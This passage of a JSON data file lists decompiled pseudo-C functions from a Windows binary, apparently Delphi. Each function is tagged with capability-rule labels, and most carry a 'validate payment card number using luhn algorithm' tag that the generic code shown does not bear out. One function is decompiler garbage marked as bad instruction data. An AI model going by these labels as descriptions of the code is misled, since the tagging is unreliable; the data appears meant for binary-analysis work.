        "decompiled_code": "\nvoid fcn.00419518(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41953a;\n        cVar3 = fcn.00418834();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x419532;\n        fcn.00419a54();\n    }\n    puStack32 = 0x419546;\n    fcn.004198f0();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x419563;\n    uVar4 = fcn.00404154();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x4195da;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.00404154();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.00418834();\n        if (cVar3 != '\\0') break;\n        fcn.00419268();\n    }\n    fcn.004198f0();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 453
    },
    "00419620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00419620(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041a764();\n    if (cVar2 == '\\x15') {\n        fcn.00418c50();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.004198a4();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 134
    },
    "00419664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00419664(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041a764();\n    if (cVar2 == '\\x0f') {\n        fcn.00418c50();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.004198a4();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 135
    },
    "004196a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004196a8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041a764();\n    if (cVar2 == '\\x10') {\n        fcn.00418c50();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.004198a4();\n        iStack20 = ROUND(iVar1 * *0x4196f4);\n    }\n    return iStack20;\n}\n",
        "token_count": 147
    },
    "004196f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004196f8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041a764();\n    if (cVar2 == '\\x11') {\n        fcn.00418c50();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.004198a4();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 135
    },
    "00419838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00419838(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041a764();\n    if (cVar1 == '\\x02') {\n        fcn.00418c50();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00418c50();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.00418c50();\n    }\n    else {\n        fcn.00418660();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 186
    },
    "004198a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004198a4(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.00418c2c();\n    if (cVar1 == '\\x13') {\n        fcn.0041a764();\n        fcn.00418c50();\n    }\n    else {\n        iStack12 = fcn.00419838();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 126
    },
    "00419c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419c58(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.004148d8();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00411b60();\n        return;\n    }\n    fcn.00418660();\n    return;\n}\n",
        "token_count": 109
    },
    "0041a114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a114(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404df4();\n    while( true ) {\n        cVar1 = fcn.00414a70();\n        if (cVar1 != '\\0') break;\n        fcn.00409c80(param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041a5c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a5c4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41a671;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.00418c2c();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041a680();\n        fcn.00405028();\n    }\n    else {\n        cVar1 = fcn.0041a764();\n        if (cVar1 == '\\x06') {\n            fcn.00418c50();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00418c50();\n        }\n        else {\n            fcn.00418660();\n        }\n        fcn.004054ec();\n        fcn.00418c50();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41a678;\n    uStack28 = 0x41a670;\n    fcn.00405580();\n    return;\n}\n",
        "token_count": 302
    },
    "0041a680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a680(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41a757;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.00418c2c();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041a5c4();\n        fcn.004056d0();\n    }\n    else {\n        cVar1 = fcn.0041a764();\n        if (cVar1 == '\\x12') {\n            fcn.00418c50();\n            fcn.004057cc();\n            fcn.00418c50();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.00418c50();\n            fcn.004054ec();\n            fcn.00418c50();\n            fcn.00406948();\n        }\n        else {\n            fcn.00418660();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41a75e;\n    uStack32 = 0x41a74e;\n    fcn.00404da0();\n    uStack32 = 0x41a756;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 356
    },
    "0041aa6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041aa6c(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041aa6c::var_1h + 1;\n    uStack36 = 0x41ab04;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041aa6c::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041a588();\n        fcn.0041a588();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.00418834();\n        if (cVar2 != '\\0') break;\n        fcn.0041aa24();\n        puVar1 = puStack32;\n    }\n    fcn.004198f0();\n    while( true ) {\n        cVar2 = fcn.00418834();\n        if (cVar2 != '\\0') break;\n        fcn.0041aa6c();\n    }\n    fcn.004198f0();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ab0b;\n    uStack36 = 0x41ab03;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 413
    },
    "0041ac80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ac80(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.00418c50();\n                param_2 = 0;\n            }\n            else {\n                fcn.00418c50();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041acc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041acc8(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41ae71;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41acf4;\n    fcn.004186ec();\n    puStack52 = 0x41ad05;\n    fcn.00403f28();\n    uStack56 = 0x41ae4c;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403f28();\n    fcn.00418c50();\n    fcn.004175b4(var_18h, var_18h >> 0x1f);\n    fcn.00418c50();\n    puStack76 = 0x41ad6e;\n    fcn.00417f80(0x400);\n    uStack80 = 0x41ae27;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041a5c4();\n    fcn.00418c50();\n    fcn.004175b4(var_18h, var_18h >> 0x1f);\n    fcn.00418c50();\n    cVar1 = fcn.004116d8();\n    if (cVar1 != '\\0') {\n        fcn.00406570();\n        cVar1 = fcn.0040e14c();\n        if (cVar1 != '\\0') goto code_r0x0041adfa;\n    }\n    fcn.0040c668();\n    fcn.004047cc();\ncode_r0x0041adfa:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41ae2e;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 623
    },
    "0041b50c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041b50c(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x41b554;\n    if (param_1 != 0) {\n        fcn.0041b6c8();\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "0041ba7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ba7c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.004051b0();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00408c70();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040c6a4(0, &iStack20);\n                fcn.004047cc();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.0041bc00();\n        fcn.0041bb0c();\n        fcn.0041bc00();\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "0041bc00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bc00(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.0040503c();\n        piVar1 = fcn.0040422c();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0041be44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041be44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 171
    },
    "0041c03c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c03c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 189
    },
    "0041c5b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c5b8(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 69
    },
    "0041c958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c958(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "0041ce50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ce50(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    uVar1 = fcn.0041c958();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.0041c958();\n    *(in_EAX + 0x14) = uVar1;\n    uVar1 = fcn.0041c958();\n    *(in_EAX + 0x18) = uVar1;\n    fcn.00404da0();\n    *(in_EAX + 0x1c) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 253
    },
    "0041e847": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0041e8c6) overlaps instruction at (ram,0x0041e8c2)\n// \n// WARNING: Possible PIC construction at 0x0041e861: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0041e866)\n\nuint64_t __fastcall fcn.0041e847(char *param_1, char *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint64_t uVar5;\n    int32_t in_EAX;\n    char *pcVar6;\n    uint uVar7;\n    uint32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    uint32_t uVar8;\n    char unaff_BL;\n    int16_t iVar9;\n    int32_t unaff_EBP;\n    uint *puVar10;\n    int16_t unaff_DI;\n    ushort in_SS;\n    ushort in_GS;\n    char **in_FS_OFFSET;\n    uint32_t *puVar11;\n    uint32_t uStack16;\n    uchar uStack12;\n    \n    *(in_EAX + 0x3f) = *(in_EAX + 0x3f) + param_1;\n    uStack16 = in_EAX + 1;\n    *param_2 = *param_2 + param_2;\n    iVar9 = unaff_EBP + 1;\n    piVar2 = segment(in_GS, iVar9 + unaff_DI + 0x74);\n    uVar5 = *piVar2 * 0x78457972;\n    puVar10 = uVar5;\n    puVar1 = unaff_EBP + 0x71;\n    uVar4 = *puVar1;\n    *puVar1 = *puVar1 + (puVar10 != uVar5) * -(uVar4 & 3);\n    if (-(uVar4 & 3) < 1) {\n        out(*puVar10, param_2);\n        out(*(puVar10 + 1), param_2);\n        uVar3 = *(puVar10 + 5);\n        pcVar6 = uStack16 & 0xffffff00 | uVar3;\n        param_1[(unaff_EBP + 1) * 8 + 0x41] = param_1[(unaff_EBP + 1) * 8 + 0x41] + (param_2 >> 8);\n        *(puVar10 + 6) = *(puVar10 + 6) + param_1;\n        *pcVar6 = *pcVar6 + uVar3;\n        *pcVar6 = *pcVar6 + uVar3;\n        *param_1 = *param_1 + uVar3;\n        *pcVar6 = *pcVar6 + uVar3;\n        (pcVar6 + 0x100040)[param_2] = (pcVar6 + 0x100040)[param_2] + (param_1 >> 8);\n        *pcVar6 = *pcVar6 + uVar3;\n        puVar11 = param_2 * 3 + 0x65;\n        *puVar11 = *puVar11 | param_2;\n        segment(in_SS, iVar9 + unaff_DI + 0x74);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (puVar10 == uVar5) {\n        puVar11 = &uStack16;\n        uStack12 = 0xb;\n        fcn.0040c6a4(0, &uStack16);\n        uVar7 = fcn.004047cc();\n        return CONCAT44(puVar11, uVar7);\n    }\n    LOCK();\n    fcn.0041e9d0();\n    puVar10[6] = 0xf003f;\n    *(puVar10 + 3) = 1;\n    uVar8 = extraout_EDX;\n    if (unaff_BL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = param_2;\n        uVar8 = extraout_EDX_00;\n    }\n    return uVar5 & 0xffffffff | uVar8 << 0x20;\n}\n",
        "token_count": 971
    },
    "0041e930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041e930(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041e9d0();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "0041ec3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041ec3c(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.0041ebec();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 89
    },
    "0041ecdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041ecdc(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.00405264(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040c6a4(0, &var_ch);\n        fcn.004047cc();\n    }\n    uVar1 = fcn.0041e908();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 220
    },
    "0041ff38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ff38(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "0041ff44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ff44(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "004200f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004200f8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x420111;\n    fcn.0041ff38();\n    uStack32 = 0x420161;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.0041ff50();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.00404154();\n    }\n    fcn.00420034();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x420168;\n    uStack32 = 0x420160;\n    fcn.0041ff44();\n    return;\n}\n",
        "token_count": 257
    },
    "00420260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420260(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x420277;\n    iVar1 = fcn.004152b4();\n    uStack28 = 0x4202fd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.00414eec();\n        fcn.00421928();\n        var_4h = var_4h + 1;\n        fcn.00421cb0();\n    }\n    fcn.004201f0();\n    fcn.004201f0();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x420304;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x4202e9;\n            fcn.00414eec();\n            uStack28 = 0x4202ee;\n            fcn.00421b58();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x4202fc;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 346
    },
    "00420a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420a44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    *0x490b34 = 0;\n    uVar1 = fcn.0041ff50();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x496358;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00420adc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420adc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x420af7;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x420b07;\n        fcn.00420790();\n        uStack24 = 0x420b97;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x420b1f;\n        puStack20 = &stack0xfffffffc;\n        fcn.00420790();\n        uStack36 = 0x420b7a;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00420174();\n        fcn.00420c18();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.00420f5c();\n            fcn.00420f78();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x420b81;\n        uStack36 = 0x420b79;\n        fcn.004207a0();\n        return;\n    }\n    puStack20 = 0x420ba9;\n    fcn.00415504();\n    return;\n}\n",
        "token_count": 403
    },
    "00420e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420e94(void)\n\n{\n    fcn.00420984();\n    fcn.00420bc8();\n    return;\n}\n",
        "token_count": 33
    },
    "00420ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420ec0(void)\n\n{\n    fcn.00420bb0();\n    fcn.00420bc8();\n    return;\n}\n",
        "token_count": 34
    },
    "00420fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
